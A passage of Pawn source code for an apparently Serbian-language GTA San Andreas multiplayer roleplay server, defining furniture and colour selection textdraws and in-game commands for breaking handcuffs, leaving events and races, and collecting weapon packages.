		PlayerTextDrawBackgroundColor(playerid, PNamjestaj_pTD[playerid][2], 255);
		PlayerTextDrawFont(playerid, PNamjestaj_pTD[playerid][2], 1);
		PlayerTextDrawSetProportional(playerid, PNamjestaj_pTD[playerid][2], 1);
		PlayerTextDrawSetShadow(playerid, PNamjestaj_pTD[playerid][2], 0);

		PNamjestaj_pTD[playerid][3] = CreatePlayerTextDraw(playerid, 276.222290, 189.502243, "box");
		PlayerTextDrawLetterSize(playerid, PNamjestaj_pTD[playerid][3], 0.000000, 5.911110);
		PlayerTextDrawTextSize(playerid, PNamjestaj_pTD[playerid][3], 347.000000, 0.000000);
		PlayerTextDrawAlignment(playerid, PNamjestaj_pTD[playerid][3], 1);
		PlayerTextDrawColor(playerid, PNamjestaj_pTD[playerid][3], -1);
		PlayerTextDrawUseBox(playerid, PNamjestaj_pTD[playerid][3], 1);
		PlayerTextDrawBoxColor(playerid, PNamjestaj_pTD[playerid][3], 117901462);
		PlayerTextDrawSetShadow(playerid, PNamjestaj_pTD[playerid][3], 0);
		PlayerTextDrawSetOutline(playerid, PNamjestaj_pTD[playerid][3], 0);
		PlayerTextDrawBackgroundColor(playerid, PNamjestaj_pTD[playerid][3], 255);
		PlayerTextDrawFont(playerid, PNamjestaj_pTD[playerid][3], 1);
		PlayerTextDrawSetProportional(playerid, PNamjestaj_pTD[playerid][3], 1);
		PlayerTextDrawSetShadow(playerid, PNamjestaj_pTD[playerid][3], 0);

		PNamjestaj_pTD[playerid][4] = CreatePlayerTextDraw(playerid, 352.666992, 189.502243, "box");
		PlayerTextDrawLetterSize(playerid, PNamjestaj_pTD[playerid][4], 0.000000, 5.911110);
		PlayerTextDrawTextSize(playerid, PNamjestaj_pTD[playerid][4], 423.000000, 0.000000);
		PlayerTextDrawAlignment(playerid, PNamjestaj_pTD[playerid][4], 1);
		PlayerTextDrawColor(playerid, PNamjestaj_pTD[playerid][4], -1);
		PlayerTextDrawUseBox(playerid, PNamjestaj_pTD[playerid][4], 1);
		PlayerTextDrawBoxColor(playerid, PNamjestaj_pTD[playerid][4], 117901462);
		PlayerTextDrawSetShadow(playerid, PNamjestaj_pTD[playerid][4], 0);
		PlayerTextDrawSetOutline(playerid, PNamjestaj_pTD[playerid][4], 0);
		PlayerTextDrawBackgroundColor(playerid, PNamjestaj_pTD[playerid][4], 255);
		PlayerTextDrawFont(playerid, PNamjestaj_pTD[playerid][4], 1);
		PlayerTextDrawSetProportional(playerid, PNamjestaj_pTD[playerid][4], 1);
		PlayerTextDrawSetShadow(playerid, PNamjestaj_pTD[playerid][4], 0);

		PNamjestaj_pTD[playerid][5] = CreatePlayerTextDraw(playerid, 428.222656, 189.502243, "box");
		PlayerTextDrawLetterSize(playerid, PNamjestaj_pTD[playerid][5], 0.000000, 5.911110);
		PlayerTextDrawTextSize(playerid, PNamjestaj_pTD[playerid][5], 499.000000, 0.000000);
		PlayerTextDrawAlignment(playerid, PNamjestaj_pTD[playerid][5], 1);
		PlayerTextDrawColor(playerid, PNamjestaj_pTD[playerid][5], -1);
		PlayerTextDrawUseBox(playerid, PNamjestaj_pTD[playerid][5], 1);
		PlayerTextDrawBoxColor(playerid, PNamjestaj_pTD[playerid][5], 117901462);
		PlayerTextDrawSetShadow(playerid, PNamjestaj_pTD[playerid][5], 0);
		PlayerTextDrawSetOutline(playerid, PNamjestaj_pTD[playerid][5], 0);
		PlayerTextDrawBackgroundColor(playerid, PNamjestaj_pTD[playerid][5], 255);
		PlayerTextDrawFont(playerid, PNamjestaj_pTD[playerid][5], 1);
		PlayerTextDrawSetProportional(playerid, PNamjestaj_pTD[playerid][5], 1);
		PlayerTextDrawSetShadow(playerid, PNamjestaj_pTD[playerid][5], 0);

		PNamjestaj_pTD[playerid][6] = CreatePlayerTextDraw(playerid, 122.333351, 175.988677, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, PNamjestaj_pTD[playerid][6], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, PNamjestaj_pTD[playerid][6], 378.430419, 10.000000);
		PlayerTextDrawAlignment(playerid, PNamjestaj_pTD[playerid][6], 1);
		PlayerTextDrawColor(playerid, PNamjestaj_pTD[playerid][6], 1012446719);
		PlayerTextDrawSetShadow(playerid, PNamjestaj_pTD[playerid][6], 0);
		PlayerTextDrawSetOutline(playerid, PNamjestaj_pTD[playerid][6], 0);
		PlayerTextDrawBackgroundColor(playerid, PNamjestaj_pTD[playerid][6], 255);
		PlayerTextDrawFont(playerid, PNamjestaj_pTD[playerid][6], 4);
		PlayerTextDrawSetProportional(playerid, PNamjestaj_pTD[playerid][6], 0);
		PlayerTextDrawSetShadow(playerid, PNamjestaj_pTD[playerid][6], 0);

		PNamjestaj_pTD[playerid][7] = CreatePlayerTextDraw(playerid, 194.288711, 177.360061, "odaberite predmet");
		PlayerTextDrawLetterSize(playerid, PNamjestaj_pTD[playerid][7], 0.161777, 0.704000);
		PlayerTextDrawAlignment(playerid, PNamjestaj_pTD[playerid][7], 3);
		PlayerTextDrawColor(playerid, PNamjestaj_pTD[playerid][7], -1);
		PlayerTextDrawSetShadow(playerid, PNamjestaj_pTD[playerid][7], 0);
		PlayerTextDrawSetOutline(playerid, PNamjestaj_pTD[playerid][7], 0);
		PlayerTextDrawBackgroundColor(playerid, PNamjestaj_pTD[playerid][7], 255);
		PlayerTextDrawFont(playerid, PNamjestaj_pTD[playerid][7], 2);
		PlayerTextDrawSetProportional(playerid, PNamjestaj_pTD[playerid][7], 1);
		PlayerTextDrawSetShadow(playerid, PNamjestaj_pTD[playerid][7], 0);

		PNamjestaj_pTD[playerid][8] = CreatePlayerTextDraw(playerid, 135.511108, 191.535552, "");
		PlayerTextDrawLetterSize(playerid, PNamjestaj_pTD[playerid][8], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, PNamjestaj_pTD[playerid][8], 45.000000, 45.000000);
		PlayerTextDrawAlignment(playerid, PNamjestaj_pTD[playerid][8], 1);
		PlayerTextDrawColor(playerid, PNamjestaj_pTD[playerid][8], -1);
		PlayerTextDrawSetShadow(playerid, PNamjestaj_pTD[playerid][8], 0);
		PlayerTextDrawSetOutline(playerid, PNamjestaj_pTD[playerid][8], 0);
		PlayerTextDrawBackgroundColor(playerid, PNamjestaj_pTD[playerid][8], 0);
		PlayerTextDrawFont(playerid, PNamjestaj_pTD[playerid][8], 5);
		PlayerTextDrawSetProportional(playerid, PNamjestaj_pTD[playerid][8], 0);
		PlayerTextDrawSetShadow(playerid, PNamjestaj_pTD[playerid][8], 0);
		PlayerTextDrawSetSelectable(playerid, PNamjestaj_pTD[playerid][8], true);
		PlayerTextDrawSetPreviewModel(playerid, PNamjestaj_pTD[playerid][8], 19831);
		PlayerTextDrawSetPreviewRot(playerid, PNamjestaj_pTD[playerid][8], 0.000000, 0.000000, -75.000000, 1.000000);

		PNamjestaj_pTD[playerid][9] = CreatePlayerTextDraw(playerid, 210.622131, 191.535552, "");
		PlayerTextDrawLetterSize(playerid, PNamjestaj_pTD[playerid][9], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, PNamjestaj_pTD[playerid][9], 45.000000, 45.000000);
		PlayerTextDrawAlignment(playerid, PNamjestaj_pTD[playerid][9], 1);
		PlayerTextDrawColor(playerid, PNamjestaj_pTD[playerid][9], -1);
		PlayerTextDrawSetShadow(playerid, PNamjestaj_pTD[playerid][9], 0);
		PlayerTextDrawSetOutline(playerid, PNamjestaj_pTD[playerid][9], 0);
		PlayerTextDrawBackgroundColor(playerid, PNamjestaj_pTD[playerid][9], 0);
		PlayerTextDrawFont(playerid, PNamjestaj_pTD[playerid][9], 5);
		PlayerTextDrawSetProportional(playerid, PNamjestaj_pTD[playerid][9], 0);
		PlayerTextDrawSetShadow(playerid, PNamjestaj_pTD[playerid][9], 0);
		PlayerTextDrawSetSelectable(playerid, PNamjestaj_pTD[playerid][9], true);
		PlayerTextDrawSetPreviewModel(playerid, PNamjestaj_pTD[playerid][9], 1518);
		PlayerTextDrawSetPreviewRot(playerid, PNamjestaj_pTD[playerid][9], 0.000000, 0.000000, -75.000000, 1.000000);

		PNamjestaj_pTD[playerid][10] = CreatePlayerTextDraw(playerid, 285.288635, 189.046691, "");
		PlayerTextDrawLetterSize(playerid, PNamjestaj_pTD[playerid][10], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, PNamjestaj_pTD[playerid][10], 45.000000, 45.000000);
		PlayerTextDrawAlignment(playerid, PNamjestaj_pTD[playerid][10], 1);
		PlayerTextDrawColor(playerid, PNamjestaj_pTD[playerid][10], -1);
		PlayerTextDrawSetShadow(playerid, PNamjestaj_pTD[playerid][10], 0);
		PlayerTextDrawSetOutline(playerid, PNamjestaj_pTD[playerid][10], 0);
		PlayerTextDrawBackgroundColor(playerid, PNamjestaj_pTD[playerid][10], 0);
		PlayerTextDrawFont(playerid, PNamjestaj_pTD[playerid][10], 5);
		PlayerTextDrawSetProportional(playerid, PNamjestaj_pTD[playerid][10], 0);
		PlayerTextDrawSetShadow(playerid, PNamjestaj_pTD[playerid][10], 0);
		PlayerTextDrawSetSelectable(playerid, PNamjestaj_pTD[playerid][10], true);
		PlayerTextDrawSetPreviewModel(playerid, PNamjestaj_pTD[playerid][10], 1738);
		PlayerTextDrawSetPreviewRot(playerid, PNamjestaj_pTD[playerid][10], 0.000000, 0.000000, -75.000000, 1.000000);

		PNamjestaj_pTD[playerid][11] = CreatePlayerTextDraw(playerid, 361.733123, 189.046691, "");
		PlayerTextDrawLetterSize(playerid, PNamjestaj_pTD[playerid][11], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, PNamjestaj_pTD[playerid][11], 45.000000, 45.000000);
		PlayerTextDrawAlignment(playerid, PNamjestaj_pTD[playerid][11], 1);
		PlayerTextDrawColor(playerid, PNamjestaj_pTD[playerid][11], -133);
		PlayerTextDrawSetShadow(playerid, PNamjestaj_pTD[playerid][11], 0);
		PlayerTextDrawSetOutline(playerid, PNamjestaj_pTD[playerid][11], 0);
		PlayerTextDrawBackgroundColor(playerid, PNamjestaj_pTD[playerid][11], 0);
		PlayerTextDrawFont(playerid, PNamjestaj_pTD[playerid][11], 5);
		PlayerTextDrawSetProportional(playerid, PNamjestaj_pTD[playerid][11], 0);
		PlayerTextDrawSetShadow(playerid, PNamjestaj_pTD[playerid][11], 0);
		PlayerTextDrawSetSelectable(playerid, PNamjestaj_pTD[playerid][11], true);
		PlayerTextDrawSetPreviewModel(playerid, PNamjestaj_pTD[playerid][11], 1782);
		PlayerTextDrawSetPreviewRot(playerid, PNamjestaj_pTD[playerid][11], 0.000000, 0.000000, -75.000000, 1.000000);

		PNamjestaj_pTD[playerid][12] = CreatePlayerTextDraw(playerid, 438.122131, 188.646667, "");
		PlayerTextDrawLetterSize(playerid, PNamjestaj_pTD[playerid][12], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, PNamjestaj_pTD[playerid][12], 45.000000, 45.000000);
		PlayerTextDrawAlignment(playerid, PNamjestaj_pTD[playerid][12], 1);
		PlayerTextDrawColor(playerid, PNamjestaj_pTD[playerid][12], -133);
		PlayerTextDrawSetShadow(playerid, PNamjestaj_pTD[playerid][12], 0);
		PlayerTextDrawSetOutline(playerid, PNamjestaj_pTD[playerid][12], 0);
		PlayerTextDrawBackgroundColor(playerid, PNamjestaj_pTD[playerid][12], 0);
		PlayerTextDrawFont(playerid, PNamjestaj_pTD[playerid][12], 5);
		PlayerTextDrawSetProportional(playerid, PNamjestaj_pTD[playerid][12], 0);
		PlayerTextDrawSetShadow(playerid, PNamjestaj_pTD[playerid][12], 0);
		PlayerTextDrawSetSelectable(playerid, PNamjestaj_pTD[playerid][12], true);
		PlayerTextDrawSetPreviewModel(playerid, PNamjestaj_pTD[playerid][12], 2339);
		PlayerTextDrawSetPreviewRot(playerid, PNamjestaj_pTD[playerid][12], 0.000000, 0.000000, -75.000000, 1.000000);

		for(new i = 0; i < 13; i++) PlayerTextDrawShow(playerid, PNamjestaj_pTD[playerid][i]);
		SelectTextDraw(playerid, 0x4282C0FF);
	}
	else if(show == false) {
		for( new i = 0; i < 13; i ++)
		{
		    PlayerTextDrawHide( playerid, PNamjestaj_pTD[ playerid ][ i ] );
			PlayerTextDrawDestroy( playerid, PNamjestaj_pTD[ playerid ][ i ] );
			PNamjestaj_pTD[ playerid ][ i ] = PlayerText:INVALID_TEXT_DRAW;
			CancelSelectTextDraw(playerid);
		}
	}
}

_:public posao_PNamjestajColorTDs(playerid, bool:show) {
	if(show == true) {
		PNamjestajColor_pTD[playerid][0] = CreatePlayerTextDraw(playerid, 173.788879, 189.599975, "box");
		PlayerTextDrawLetterSize(playerid, PNamjestajColor_pTD[playerid][0], 0.000000, 5.524528);
		PlayerTextDrawTextSize(playerid, PNamjestajColor_pTD[playerid][0], 439.220214, 0.000000);
		PlayerTextDrawAlignment(playerid, PNamjestajColor_pTD[playerid][0], 1);
		PlayerTextDrawColor(playerid, PNamjestajColor_pTD[playerid][0], -1);
		PlayerTextDrawUseBox(playerid, PNamjestajColor_pTD[playerid][0], 1);
		PlayerTextDrawBoxColor(playerid, PNamjestajColor_pTD[playerid][0], 117901462);
		PlayerTextDrawSetShadow(playerid, PNamjestajColor_pTD[playerid][0], 0);
		PlayerTextDrawSetOutline(playerid, PNamjestajColor_pTD[playerid][0], 0);
		PlayerTextDrawBackgroundColor(playerid, PNamjestajColor_pTD[playerid][0], 255);
		PlayerTextDrawFont(playerid, PNamjestajColor_pTD[playerid][0], 1);
		PlayerTextDrawSetProportional(playerid, PNamjestajColor_pTD[playerid][0], 1);
		PlayerTextDrawSetShadow(playerid, PNamjestajColor_pTD[playerid][0], 0);

		PNamjestajColor_pTD[playerid][1] = CreatePlayerTextDraw(playerid, 173.944564, 189.346664, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, PNamjestajColor_pTD[playerid][1], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, PNamjestajColor_pTD[playerid][1], 264.300292, 10.000000);
		PlayerTextDrawAlignment(playerid, PNamjestajColor_pTD[playerid][1], 1);
		PlayerTextDrawColor(playerid, PNamjestajColor_pTD[playerid][1], 1012446719);
		PlayerTextDrawSetShadow(playerid, PNamjestajColor_pTD[playerid][1], 0);
		PlayerTextDrawSetOutline(playerid, PNamjestajColor_pTD[playerid][1], 0);
		PlayerTextDrawBackgroundColor(playerid, PNamjestajColor_pTD[playerid][1], 255);
		PlayerTextDrawFont(playerid, PNamjestajColor_pTD[playerid][1], 4);
		PlayerTextDrawSetProportional(playerid, PNamjestajColor_pTD[playerid][1], 0);
		PlayerTextDrawSetShadow(playerid, PNamjestajColor_pTD[playerid][1], 0);

		PNamjestajColor_pTD[playerid][2] = CreatePlayerTextDraw(playerid, 174.333358, 201.395568, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, PNamjestajColor_pTD[playerid][2], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, PNamjestajColor_pTD[playerid][2], 43.000000, 37.000000);
		PlayerTextDrawAlignment(playerid, PNamjestajColor_pTD[playerid][2], 1);
		PlayerTextDrawColor(playerid, PNamjestajColor_pTD[playerid][2], 0xFFFFFFFF);
		PlayerTextDrawSetShadow(playerid, PNamjestajColor_pTD[playerid][2], 0);
		PlayerTextDrawSetOutline(playerid, PNamjestajColor_pTD[playerid][2], 0);
		PlayerTextDrawBackgroundColor(playerid, PNamjestajColor_pTD[playerid][2], 255);
		PlayerTextDrawFont(playerid, PNamjestajColor_pTD[playerid][2], 4);
		PlayerTextDrawSetProportional(playerid, PNamjestajColor_pTD[playerid][2], 0);
		PlayerTextDrawSetShadow(playerid, PNamjestajColor_pTD[playerid][2], 0);
		PlayerTextDrawSetSelectable(playerid, PNamjestajColor_pTD[playerid][2], true);

		PNamjestajColor_pTD[playerid][3] = CreatePlayerTextDraw(playerid, 218.333343, 201.395568, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, PNamjestajColor_pTD[playerid][3], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, PNamjestajColor_pTD[playerid][3], 43.000000, 37.000000);
		PlayerTextDrawAlignment(playerid, PNamjestajColor_pTD[playerid][3], 1);
		PlayerTextDrawColor(playerid, PNamjestajColor_pTD[playerid][3], 0x000000FF);
		PlayerTextDrawSetShadow(playerid, PNamjestajColor_pTD[playerid][3], 0);
		PlayerTextDrawSetOutline(playerid, PNamjestajColor_pTD[playerid][3], 0);
		PlayerTextDrawBackgroundColor(playerid, PNamjestajColor_pTD[playerid][3], 255);
		PlayerTextDrawFont(playerid, PNamjestajColor_pTD[playerid][3], 4);
		PlayerTextDrawSetProportional(playerid, PNamjestajColor_pTD[playerid][3], 0);
		PlayerTextDrawSetShadow(playerid, PNamjestajColor_pTD[playerid][3], 0);
		PlayerTextDrawSetSelectable(playerid, PNamjestajColor_pTD[playerid][3], true);

		PNamjestajColor_pTD[playerid][4] = CreatePlayerTextDraw(playerid, 262.489013, 201.395568, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, PNamjestajColor_pTD[playerid][4], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, PNamjestajColor_pTD[playerid][4], 43.000000, 37.000000);
		PlayerTextDrawAlignment(playerid, PNamjestajColor_pTD[playerid][4], 1);
		PlayerTextDrawColor(playerid, PNamjestajColor_pTD[playerid][4], 0xFF0000FF);
		PlayerTextDrawSetShadow(playerid, PNamjestajColor_pTD[playerid][4], 0);
		PlayerTextDrawSetOutline(playerid, PNamjestajColor_pTD[playerid][4], 0);
		PlayerTextDrawBackgroundColor(playerid, PNamjestajColor_pTD[playerid][4], 255);
		PlayerTextDrawFont(playerid, PNamjestajColor_pTD[playerid][4], 4);
		PlayerTextDrawSetProportional(playerid, PNamjestajColor_pTD[playerid][4], 0);
		PlayerTextDrawSetShadow(playerid, PNamjestajColor_pTD[playerid][4], 0);
		PlayerTextDrawSetSelectable(playerid, PNamjestajColor_pTD[playerid][4], true);

		PNamjestajColor_pTD[playerid][5] = CreatePlayerTextDraw(playerid, 306.978057, 201.395568, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, PNamjestajColor_pTD[playerid][5], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, PNamjestajColor_pTD[playerid][5], 43.000000, 37.000000);
		PlayerTextDrawAlignment(playerid, PNamjestajColor_pTD[playerid][5], 1);
		PlayerTextDrawColor(playerid, PNamjestajColor_pTD[playerid][5], 0x1c28d4FF);
		PlayerTextDrawSetShadow(playerid, PNamjestajColor_pTD[playerid][5], 0);
		PlayerTextDrawSetOutline(playerid, PNamjestajColor_pTD[playerid][5], 0);
		PlayerTextDrawBackgroundColor(playerid, PNamjestajColor_pTD[playerid][5], 255);
		PlayerTextDrawFont(playerid, PNamjestajColor_pTD[playerid][5], 4);
		PlayerTextDrawSetProportional(playerid, PNamjestajColor_pTD[playerid][5], 0);
		PlayerTextDrawSetShadow(playerid, PNamjestajColor_pTD[playerid][5], 0);
		PlayerTextDrawSetSelectable(playerid, PNamjestajColor_pTD[playerid][5], true);

		PNamjestajColor_pTD[playerid][6] = CreatePlayerTextDraw(playerid, 351.167114, 201.395568, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, PNamjestajColor_pTD[playerid][6], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, PNamjestajColor_pTD[playerid][6], 43.000000, 37.000000);
		PlayerTextDrawAlignment(playerid, PNamjestajColor_pTD[playerid][6], 1);
		PlayerTextDrawColor(playerid, PNamjestajColor_pTD[playerid][6], 0x1cd43eFF);
		PlayerTextDrawSetShadow(playerid, PNamjestajColor_pTD[playerid][6], 0);
		PlayerTextDrawSetOutline(playerid, PNamjestajColor_pTD[playerid][6], 0);
		PlayerTextDrawBackgroundColor(playerid, PNamjestajColor_pTD[playerid][6], 255);
		PlayerTextDrawFont(playerid, PNamjestajColor_pTD[playerid][6], 4);
		PlayerTextDrawSetProportional(playerid, PNamjestajColor_pTD[playerid][6], 0);
		PlayerTextDrawSetShadow(playerid, PNamjestajColor_pTD[playerid][6], 0);
		PlayerTextDrawSetSelectable(playerid, PNamjestajColor_pTD[playerid][6], true);

		PNamjestajColor_pTD[playerid][7] = CreatePlayerTextDraw(playerid, 395.566986, 201.395568, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, PNamjestajColor_pTD[playerid][7], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, PNamjestajColor_pTD[playerid][7], 43.000000, 37.000000);
		PlayerTextDrawAlignment(playerid, PNamjestajColor_pTD[playerid][7], 1);
		PlayerTextDrawColor(playerid, PNamjestajColor_pTD[playerid][7], 0xbab130FF);
		PlayerTextDrawSetShadow(playerid, PNamjestajColor_pTD[playerid][7], 0);
		PlayerTextDrawSetOutline(playerid, PNamjestajColor_pTD[playerid][7], 0);
		PlayerTextDrawBackgroundColor(playerid, PNamjestajColor_pTD[playerid][7], 255);
		PlayerTextDrawFont(playerid, PNamjestajColor_pTD[playerid][7], 4);
		PlayerTextDrawSetProportional(playerid, PNamjestajColor_pTD[playerid][7], 0);
		PlayerTextDrawSetShadow(playerid, PNamjestajColor_pTD[playerid][7], 0);
		PlayerTextDrawSetSelectable(playerid, PNamjestajColor_pTD[playerid][7], true);

		PNamjestajColor_pTD[playerid][8] = CreatePlayerTextDraw(playerid, 228.222183, 191.193328, "ODABERITE BOJU");
		PlayerTextDrawLetterSize(playerid, PNamjestajColor_pTD[playerid][8], 0.151111, 0.748266);
		PlayerTextDrawAlignment(playerid, PNamjestajColor_pTD[playerid][8], 3);
		PlayerTextDrawColor(playerid, PNamjestajColor_pTD[playerid][8], -1);
		PlayerTextDrawSetShadow(playerid, PNamjestajColor_pTD[playerid][8], 0);
		PlayerTextDrawSetOutline(playerid, PNamjestajColor_pTD[playerid][8], 0);
		PlayerTextDrawBackgroundColor(playerid, PNamjestajColor_pTD[playerid][8], 255);
		PlayerTextDrawFont(playerid, PNamjestajColor_pTD[playerid][8], 2);
		PlayerTextDrawSetProportional(playerid, PNamjestajColor_pTD[playerid][8], 1);
		PlayerTextDrawSetShadow(playerid, PNamjestajColor_pTD[playerid][8], 0);

		for(new i = 0; i < 9; i++) PlayerTextDrawShow(playerid, PNamjestajColor_pTD[playerid][i]);
		SelectTextDraw(playerid, 0x4282C0FF);
	}
	else if(show == false) {
		for( new i = 0; i < 9; i ++)
		{
		    PlayerTextDrawHide( playerid, PNamjestajColor_pTD[ playerid ][ i ] );
			PlayerTextDrawDestroy( playerid, PNamjestajColor_pTD[ playerid ][ i ] );
			PNamjestajColor_pTD[ playerid ][ i ] = PlayerText:INVALID_TEXT_DRAW;
			CancelSelectTextDraw(playerid);
		}
	}
}

CMD:razbijlisice( playerid, const params[] )
{
	new id, Float:Pos[ 3 ], policajci = 0;
    if( sscanf( params, "r", id ) ) return SendUsageMessage(playerid, "/razbijlisice [id]");

	if( id == playerid ) return SendErrorMessage( playerid, "Ne mozes sam sebi." );
	if( id == IPI ) return SendErrorMessage( playerid, "Pogresan ID korisnika." );
	if( !IsPlayerNearPlayer( 5.0, playerid, id ) ) return SendErrorMessage( playerid, "Niste blizu igraca ciji se ID uneli.");
	if( PlayerCuffed[ playerid ] > 0 ) return SendErrorMessage( playerid, "Ne mozes dok si tazovan ili cuffovan." );

	GetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );

	foreach( new i : Player)
	{
	    if( playerid != i && IsPlayerInRangeOfPoint( i, 10, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] ) && GetFactionType( i ) == ORG_TIP_VLADINA )
		{
			policajci++;
		}
	}

	if( policajci != 0 ) return SendErrorMessage( playerid, "Ne mozes ovo dok ima policajaca u blizini." );

	PlayerCuffed[ id ] = 0;
    GameTextForPlayer( id, "~g~Razbijene su vam lisice.", 2500, 3 );
	SMG_TogglePlayerControllable( id, true );
	ClearAnimations( id );
	if( IsPlayerAttachedObjectSlotUsed( id, OBJECT_SLOT_MAIN ) ) RemovePlayerAttachedObject( id, OBJECT_SLOT_MAIN );
	SetPlayerSpecialAction( id, SPECIAL_ACTION_NONE );
    return 1;
}

CMD:napustidm( playerid )
{
	if( !NaDmEventu[ playerid ] ) return SendErrorMessage( playerid, "Nisi na CS:DM." );
	if( PlayerInfo[ playerid ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Ne mozes dok si u zatvoru." );
    new Float:H;
	GetPlayerHealth( playerid, H );
	if( H < 10.0 ) return SendErrorMessage( playerid, "Ne mozes da izadjes sa CS:DM servera kada imas manje od 10hp." );
    if( PlayerInfo[ playerid ][ xSpawned ] == 0 ) return SendErrorMessage( playerid, "Ne mozes izaci sa CS:DM servera dok ne budes spawnovan." );

	SMG_SetPlayerPos( playerid, PozicijaWAR[ playerid ][ 0 ], PozicijaWAR[ playerid ][ 1 ],  PozicijaWAR[ playerid ][ 2 ] );
    UcitajObjekte( playerid );
	SetCameraBehindPlayer( playerid );
	SetPlayerVirtualWorld( playerid, VirtualWWAR[ playerid ] );
    SetPlayerInterior( playerid, InteriorWAR[ playerid ] );

	ResetPlayerWeapons( playerid );
	SetPlayerHealth( playerid, PlayerInfo[playerid][xSHealth]+50 );
	SetPlayerArmour( playerid, 0 );

    for( new i = 0; i < 5; i++) SendDeathMessageToPlayer( playerid, 6000, 5005, 255 );

    NaDmEventu[ playerid ] = false;
	SendInfoMessage( playerid, "Izasao si sa CS:DM servera." );
    return 1;
}

CMD:napustinsf( playerid )
{
    if( !NaUtrci[ playerid ] ) return SendErrorMessage( playerid, "Nisi na utrci." );
 	new izazivac = PonudioIgrac[ playerid ];

	DisablePlayerRaceCheckpoint( playerid );
	NaUtrci[ playerid ] = false; 
	Krugovi[ playerid ] = 0; 
	TrkaIzazov[ playerid ] = 0; 
	StaroVreme[ playerid ] = 0;
	SMG_DestroyVehicle( TrkaVozilo[ playerid ] ); 
	ResetVehicle( TrkaVozilo[ playerid ] );
	TrkaVozilo[ playerid ] = -1;
	SMG_SetPlayerPos( playerid, PlayerPos[ playerid ][ 0 ], PlayerPos[ playerid ][ 1 ], PlayerPos[ playerid ][ 2 ] );
	UcitajObjekte( playerid );
	SetCameraBehindPlayer( playerid );
	SetPlayerVirtualWorld( playerid, PlayerPosVW[ playerid ] );
	SetPlayerInterior( playerid, PlayerPosInt[ playerid ] ); 
	TrkaCheckpoint[ playerid ] = 0;
	DajIgracuNovac( playerid, ( UlogTrke[ playerid ]*2 ) );
	SendInfoMessage( playerid, "Pobedili ste na trci i osvojili {FFFFFF}($%d).", ( UlogTrke[ playerid ]*2 ) );

	if( izazivac != IPI )
	{
		DisablePlayerRaceCheckpoint( izazivac );
		SendInfoMessage( izazivac, "Izasli ste na utrke i izgubili $%d.", UlogTrke[ playerid ] );
		NaUtrci[ izazivac ] = false;
		Krugovi[ izazivac ] = 0;
		TrkaIzazov[ izazivac ] = 0;
		StaroVreme[ izazivac ] = 0;
		SMG_DestroyVehicle( TrkaVozilo[ izazivac ] ); 
		ResetVehicle( TrkaVozilo[ playerid ] );
		TrkaVozilo[ izazivac ] = -1;
		SMG_SetPlayerPos( izazivac, PlayerPos[ izazivac ][ 0 ], PlayerPos[ izazivac ][ 1 ], PlayerPos[ izazivac ][ 2 ] );
     	UcitajObjekte( izazivac );
		SetCameraBehindPlayer( izazivac );
		SetPlayerVirtualWorld( izazivac, PlayerPosVW[ izazivac ] );
		SetPlayerInterior( izazivac, PlayerPosInt[ izazivac ] ); TrkaCheckpoint[ izazivac ] = 0;
	}
    return 1;
}

CMD:uzmipaket( playerid, const params[] )
{
	if( IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Moras biti van vozila." );
	if( PlayerInfo[ playerid ][ xLevel ] < 1 ) return SendErrorMessage( playerid, "Morate biti level 1+." );
	if( GetFactionType( playerid ) == ORG_TIP_MAFIJA || GetFactionType( playerid ) == ORG_TIP_BANDA || GetFactionType( playerid ) == ORG_TIP_BAJKERI )
	{
        if( IsPlayerInRangeOfPoint( playerid, 3.0, 2410.2866,-2493.5195,13.6401 ) )
		{
			if( ServerInfo[ HangarPaket ] == 0 ) return SendErrorMessage( playerid, "Trenutno nema paketa u hangaru, novi stizu na 5 minuta." );

			if( PlayerInfo[ playerid ][ xHangarTime ] != 0 ) return SendErrorMessage( playerid, "Vec ste uzeli paket, sacekajte jos %d minuta.", PlayerInfo[ playerid ][ xHangarTime ] );

			new broj;
			if( sscanf( params, "d", broj ) )
			{
				SendUsageMessage( playerid, "/uzmipaket [broj paketa]");
		     	SendClientMessage( playerid, -1, "Paket 1: Deagle [100 metaka] + M16 [200 metaka]" );
				SendClientMessage( playerid, -1, "Paket 2: Shotgun [100 metaka] + Deagle [100 metaka]" );
				SendClientMessage( playerid, -1, "Paket 3: Sniper [75 metaka] + MP5 [200 metaka]" );
				SendClientMessage( playerid, -1, "Paket 4: Sawn-off Shotgun [100 metaka]" );
				return 1;
			}
			if(broj < 1 || broj > 4) return SendErrorMessage(playerid, "Samo paket od 1 do 4.");

			switch(broj)
			{
				case 1:
				{
				    GiveWeaponToPlayer( playerid, 24, 100 );
					GiveWeaponToPlayer( playerid, 31, 200 );
					ServerInfo[ HangarPaket ]--;
		            PlayerInfo[ playerid ][ xHangarTime ] = 15;

					SendInfoMessage( playerid, "Uzeli ste paket 1 iz hangara sa Deagleom(100) i M16(200)." );

		            if(IsValidDynamic3DTextLabel(ServerInfo[ SHangarLabel ])) DestroyDynamic3DTextLabel(ServerInfo[ SHangarLabel ]);

					new str_hang[100];
					format( str_hang, sizeof( str_hang ), "(HANGAR[ORUZJE] - [%d/10])\nDa uzmete paket kucajte \"/uzmipaket\"", ServerInfo[ HangarPaket ] );
